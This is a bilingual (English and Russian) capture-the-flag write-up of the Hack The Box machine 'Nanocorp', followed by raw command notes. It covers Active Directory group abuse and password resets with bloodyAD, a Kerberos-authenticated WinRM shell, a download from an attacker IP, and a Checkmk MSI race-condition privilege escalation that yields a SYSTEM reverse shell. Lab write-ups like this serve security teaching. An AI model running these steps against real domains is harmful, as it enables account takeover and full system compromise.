# HTB Write-up: Nanocorp (Active Directory)

## 🇬🇧 English Version

### Overview

This machine heavily focuses on Active Directory misconfigurations, Kerberos authentication troubleshooting, and exploiting a logical race condition for privilege escalation. The path to `SYSTEM` requires a deep understanding of how Windows handles temporary files and interactive logon restrictions.

### Initial Access / Foothold

**1. Abusing AD Permissions**
After obtaining the credentials for the `web_svc` user (`dksehdgh712!@#`), enumeration revealed that this account had the rights to modify the `IT_SUPPORT` group. Using `bloodyAD`, I added `web_svc` to this group, which granted the permissions necessary to reset the password for another user, `monitoring_svc`.

```bash
bloodyAD --host 10.129.19.87 -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' add groupMember IT_SUPPORT web_svc
bloodyAD --host 10.129.19.87 -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' set password monitoring_svc 'Summer2026A'

```

**2. Kerberos Authentication & Troubleshooting**
Since standard NTLM authentication was restricted (likely due to the 'Protected Users' group), I had to use Kerberos. This required meticulous setup:

* **Time Synchronization:** The KDC threw a `KRB_AP_ERR_SKEW` (Clock skew too great) error. I had to sync my local container time with the Domain Controller before requesting a ticket.
```bash
sudo ntpdate -b 10.129.19.87

```

```

sudo tee /tmp/krb5.conf << 'EOF'
[libdefaults]
default_realm = NANOCORP.HTB
dns_lookup_kdc = false
dns_lookup_realm = false

[realms]
NANOCORP.HTB = {
    kdc = dc01.nanocorp.htb
    admin_server = dc01.nanocorp.htb
}

[domain_realm]
.nanocorp.htb = NANOCORP.HTB
nanocorp.htb = NANOCORP.HTB
EOF

```


* **DNS & Configuration:** Configured `/etc/hosts` to properly resolve `DC01.nanocorp.htb` (case-sensitive) and hardcoded the KDC IP in `/etc/krb5.conf` to prevent DNS resolution hangs.
* **Ticket Granting Ticket (TGT):** Successfully obtained and cached the TGT using `kinit`.
```bash
kinit monitoring_svc@NANOCORP.HTB
export KRB5CCNAME=/tmp/krb5cc_1000

```



**3. Gaining a WinRM Shell**
Initial attempts to connect via WinRM using Evil-WinRM and Impacket timed out. An `nmap` scan revealed that the standard HTTP WinRM port (`5985`) was filtered/closed, but the secure HTTPS WinRM port (`5986`) was open. Using Impacket's `winrmexec.py` with the `-url` flag pointing to HTTPS and forcing Kerberos auth (`-k -no-pass`), I successfully obtained a shell as `monitoring_svc`.

```bash
python3 winrmexec.py NANOCORP.HTB/monitoring_svc@DC01.nanocorp.htb -k -no-pass -url https://DC01.nanocorp.htb:5986/wsman -dc-ip 10.129.19.87

```

### Privilege Escalation

**1. Bypassing Logon Restrictions (Living off the Land)**
To exploit the target service, I needed to execute commands as `web_svc`, but the system enforced "Account restrictions" preventing interactive logons. I downloaded the source code for `RunasCs` (a tool to run processes with specific credentials without an interactive prompt) and compiled it directly on the target using the native .NET compiler (`csc.exe`).

```powershell
wget "http://10.10.14.196:8000/RunasCs.cs" -UseBasicParsing -OutFile "RunasCs.cs"
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs

```

**2. Exploiting Checkmk MSI Race Condition**
The server had a vulnerable version of the Checkmk monitoring agent. When an MSI repair is triggered for this software, it runs as `NT AUTHORITY\SYSTEM`. During the repair, it creates and executes predictable temporary batch files in `C:\Windows\Temp\` formatted as `cmk_all_[PID]_[counter].cmd`.

I crafted a PowerShell exploit (`bad.ps1`) that performed the following:

* Generated a reverse shell payload using `nc.exe`.
* **Sprayed** the `C:\Windows\Temp` directory with thousands of files covering the possible PID range (1000 to 15000).
* Set the `IsReadOnly` attribute to `$true` on all sprayed files.
* Triggered the MSI repair using `msiexec.exe /fa <MSI_PATH> /qn`.

Because the files were Read-Only, the `SYSTEM` process could not overwrite them with its legitimate code. Instead, it moved to the execution phase and ran my malicious payload.

```powershell
.\RunasCs.exe web_svc "dksehdgh712!@#" "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\bad.ps1"

```

A netcat listener on my attacker machine caught the connection, yielding a `NT AUTHORITY\SYSTEM` shell. Box rooted!

---

## 🇷🇺 Russian Version

### Обзор

Эта машина в основном сфокусирована на неправильных конфигурациях Active Directory, решении проблем с Kerberos-аутентификацией и эксплуатации логической уязвимости (Race Condition) для повышения привилегий. Путь к `SYSTEM` требует глубокого понимания того, как Windows работает с временными файлами и ограничениями интерактивного входа.

### Первоначальный доступ / Точка входа

**1. Злоупотребление правами AD**
После получения учетных данных пользователя `web_svc` (`dksehdgh712!@#`), разведка показала, что эта учетная запись имеет права на изменение группы `IT_SUPPORT`. Используя `bloodyAD`, я добавил `web_svc` в эту группу, что дало права, необходимые для сброса пароля другого пользователя — `monitoring_svc`.

```bash
bloodyAD --host 10.129.19.87 -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' add groupMember IT_SUPPORT web_svc
bloodyAD --host 10.129.19.87 -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' set password monitoring_svc 'Summer2026A'

```

**2. Аутентификация Kerberos и устранение неполадок**
Поскольку стандартная NTLM-аутентификация была ограничена (вероятно, из-за группы 'Protected Users'), пришлось использовать Kerberos. Это потребовало тщательной настройки:

* **Синхронизация времени:** KDC выдавал ошибку `KRB_AP_ERR_SKEW` (слишком большая разница во времени). Мне пришлось синхронизировать локальное время контейнера с контроллером домена перед запросом билета.
```bash
sudo ntpdate -b 10.129.19.87

```


* **DNS и конфигурация:** Я настроил файл `/etc/hosts` для правильного разрешения `DC01.nanocorp.htb` (с учетом регистра) и жестко прописал IP-адрес KDC в `/etc/krb5.conf`, чтобы избежать зависаний при DNS-запросах.
* **Получение TGT:** Успешно запросил и закэшировал TGT билет с помощью `kinit`.
```bash
kinit monitoring_svc@NANOCORP.HTB
export KRB5CCNAME=/tmp/krb5cc_1000

```



**3. Получение WinRM Shell**
Первоначальные попытки подключиться через WinRM с помощью Evil-WinRM и Impacket завершались по таймауту. Сканирование `nmap` показало, что стандартный HTTP-порт WinRM (`5985`) отфильтрован/закрыт, но защищенный HTTPS-порт WinRM (`5986`) открыт. Используя `winrmexec.py` от Impacket с флагом `-url`, указывающим на HTTPS, и принудительной Kerberos-аутентификацией (`-k -no-pass`), я успешно получил шелл от имени `monitoring_svc`.

```bash
python3 winrmexec.py NANOCORP.HTB/monitoring_svc@DC01.nanocorp.htb -k -no-pass -url https://DC01.nanocorp.htb:5986/wsman -dc-ip 10.129.19.87

```

### Повышение привилегий

**1. Обход ограничений входа (Living off the Land)**
Для эксплуатации целевого сервиса мне нужно было выполнять команды от имени `web_svc`, но система применяла "Ограничения учетной записи" (Account restrictions), запрещающие интерактивный вход. Я загрузил исходный код `RunasCs` (утилита для запуска процессов с определенными учетными данными без интерактивного запроса) и скомпилировал его прямо на целевой машине, используя встроенный компилятор .NET (`csc.exe`).

```powershell
wget "http://10.10.14.196:8000/RunasCs.cs" -UseBasicParsing -OutFile "RunasCs.cs"
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs

```

**2. Эксплуатация Race Condition в Checkmk MSI**
На сервере была установлена уязвимая версия агента мониторинга Checkmk. Когда запускается процесс восстановления (repair) MSI для этого ПО, он работает от имени `NT AUTHORITY\SYSTEM`. Во время восстановления процесс создает и выполняет предсказуемые временные пакетные файлы в директории `C:\Windows\Temp\` в формате `cmk_all_[PID]_[счетчик].cmd`.

Я написал эксплойт на PowerShell (`bad.ps1`), который делал следующее:

* Генерировал пейлоад для обратного шелла с использованием `nc.exe`.
* **Засеивал (Spraying)** директорию `C:\Windows\Temp` тысячами файлов, перекрывая весь возможный диапазон PID (от 1000 до 15000).
* Устанавливал атрибут 'Только для чтения' (`IsReadOnly = $true`) на все созданные файлы.
* Запускал процесс восстановления MSI с помощью `msiexec.exe /fa <MSI_PATH> /qn`.

Поскольку файлы были доступны только для чтения, процесс `SYSTEM` не мог перезаписать их своим легитимным кодом. Вместо этого он переходил к фазе выполнения и запускал мой вредоносный пейлоад.

```powershell
.\RunasCs.exe web_svc "dksehdgh712!@#" "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\bad.ps1"

```

Слушатель netcat на моей машине атакующего поймал соединение, выдав шелл `NT AUTHORITY\SYSTEM`. Машина полностью захвачена!


user flag
bloodyAD --host 10.129.19.86 -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' add groupMember IT_SUPPORT web_svc
bloodyAD --host 10.129.19.87 -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' set password monitoring_svc 'Summer2026A'
sudo ntpdate -b 10.129.19.87
kinit monitoring_svc@NANOCORP.HTB
Summer2026A
klist
export KRB5CCNAME=/tmp/krb5cc_0
python3 winrmexec.py NANOCORP.HTB/monitoring_svc@DC01.nanocorp.htb -k -no-pass -url https://DC01.nanocorp.htb:5986/wsman -dc-ip 10.129.19.87

root flag

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs
https://securitywalay.com/blogs/nano-corp-htb-writeup/